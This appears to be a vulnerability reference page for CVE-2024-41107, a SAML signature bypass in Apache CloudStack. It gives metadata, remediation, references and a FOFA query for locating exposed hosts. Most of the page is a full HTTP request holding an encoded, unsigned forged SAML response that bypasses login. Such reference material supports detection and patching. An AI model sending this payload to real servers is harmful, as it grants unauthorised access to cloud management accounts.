---
layout: post
cve_id: CVE-2024-41107
title: Apache CloudStack - SAML Signature Exclusion
pcap: true
pcap_path: /pcaps/2024/CVE-2024-41107.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-41107.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,rootxharsh,pdresearch
severity: critical
impact: 'Unauthenticated attackers can bypass SAML authentication by submitting spoofed
  SAML responses without signatures.

  '
remediation: 'Update Apache CloudStack to a version that enforces SAML signature validation.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2024-41107
- http://www.openwall.com/lists/oss-security/2024/07/19/1
- http://www.openwall.com/lists/oss-security/2024/07/19/2
- https://cloudstack.apache.org/blog/security-release-advisory-cve-2024-41107
- https://github.com/apache/cloudstack/issues/4519
classification:
  epss-score: 0.93066
  epss-percentile: 0.99774
  cpe: cpe:2.3:a:apache:cloudstack:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  fofa-query: app="APACHE-CloudStack"
  product: cloudstack
  vendor: apache
tags:
- cve
- cve2024
- apache
- cloudstack
- auth-bypass
- vuln
---

## üîç Vulnerability Description
The CloudStack SAML authentication (disabled by default) does not enforce signature check. In CloudStack environments where SAML authentication is enabled, an attacker that initiates CloudStack SAML single sign-on authentication can bypass SAML authentication by submitting a spoofed SAML response with no signature and known or guessed username and other user details of a SAML-enabled CloudStack user-account


## üåê HTTP Request
```nohighlight
POST /client/api?command=samlSso HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15
Connection: close
Content-Length: 3102
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

RelayState=undefined&SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c2FtbHA6UmVzcG9uc2UgRGVzdGluYXRpb249Ii8vY2xpZW50L2FwaT9jb21tYW5kPXNhbWxTc28iICAgIElEPSJfYjAzODlmY2EwZWE2NWZlOGU4NTciIEluUmVzcG9uc2VUbz0ie3tzYW1sX2lkfX0iICAgIElzc3VlSW5zdGFudD0iMjAyNC0wNy0zMFQxMDo0ODoyMC4zMDdaIiBWZXJzaW9uPSIyLjAiICAgIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnhzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSI%2BICAgIDxzYW1sOklzc3VlciBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OmVudGl0eSIgICAgICAgIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPnt7ZW50aXR5aWR9fTwvc2FtbDpJc3N1ZXI%2BICAgIDxzYW1scDpTdGF0dXMgeG1sbnM6c2FtbHA9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpwcm90b2NvbCI%2BICAgICAgICA8c2FtbHA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIiAvPiAgICA8L3NhbWxwOlN0YXR1cz4gICAgPHNhbWw6QXNzZXJ0aW9uIElEPSJfN2EyOTkzNTE0MTEyYmJjNzI2OTYiIElzc3VlSW5zdGFudD0iMjAyNC0wNy0zMFQxMDo1ODoyMC4zMDdaIiBWZXJzaW9uPSIyLjAiICAgICAgICB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiAgICAgICAgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIj4gICAgICAgIDxzYW1sOklzc3VlciBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OmVudGl0eSIgICAgICAgICAgICB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj57e2VudGl0eWlkfX08L3NhbWw6SXNzdWVyPiAgICAgICAgPHNhbWw6Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMjQtMDctMzBUMTA6NDM6MjAuMzA3WiIgICAgICAgICAgICBOb3RPbk9yQWZ0ZXI9IjIwMjQtMDctMzBUMTA6NTM6MjAuMzA3WiIgICAgICAgICAgICB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj48c2FtbDpBdWRpZW5jZVJlc3RyaWN0aW9uPiAgICAgICAgICAgICAgICA8c2FtbDpBdWRpZW5jZT5vcmcuYXBhY2hlLmNsb3Vkc3RhY2s8L3NhbWw6QXVkaWVuY2U%2BICAgICAgICAgICAgPC9zYW1sOkF1ZGllbmNlUmVzdHJpY3Rpb24%2BICAgICAgICA8L3NhbWw6Q29uZGl0aW9ucz4gICAgICAgIDxzYW1sOkF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAyNC0wNy0zMFQxMDo0ODoyMC4zMDdaIiAgICAgICAgICAgIFNlc3Npb25JbmRleD0ie3tzYW1sX2lkfSIgICAgICAgICAgICB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj4gICAgICAgICAgICA8c2FtbDpBdXRobkNvbnRleHQ%2BICAgICAgICAgICAgICAgIDxzYW1sOkF1dGhuQ29udGV4dENsYXNzUmVmPiAgICAgICAgICAgICAgICAgICAgdXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmRQcm90ZWN0ZWRUcmFuc3BvcnQ8L3NhbWw6QXV0aG5Db250ZXh0Q2xhc3NSZWY%2BICAgICAgICAgICAgPC9zYW1sOkF1dGhuQ29udGV4dD4gICAgICAgIDwvc2FtbDpBdXRoblN0YXRlbWVudD4gICAgICAgIDxzYW1sOkF0dHJpYnV0ZVN0YXRlbWVudCB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj4gICAgICAgICAgICA8c2FtbDpBdHRyaWJ1dGUgTmFtZT0idWlkIiAgICAgICAgICAgICAgICBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OnVuc3BlY2lmaWVkIj4gICAgICAgICAgICAgICAgPHNhbWw6QXR0cmlidXRlVmFsdWUgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiAgICAgICAgICAgICAgICAgICAgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgeHNpOnR5cGU9InhzOnN0cmluZyI%2BbVRQYkdHPC9zYW1sOkF0dHJpYnV0ZVZhbHVlPiAgICAgICAgICAgIDwvc2FtbDpBdHRyaWJ1dGU%2BICAgICAgICAgICAgICAgICAgICA8L3NhbWw6QXR0cmlidXRlU3RhdGVtZW50PiAgICA8L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U%2B
```

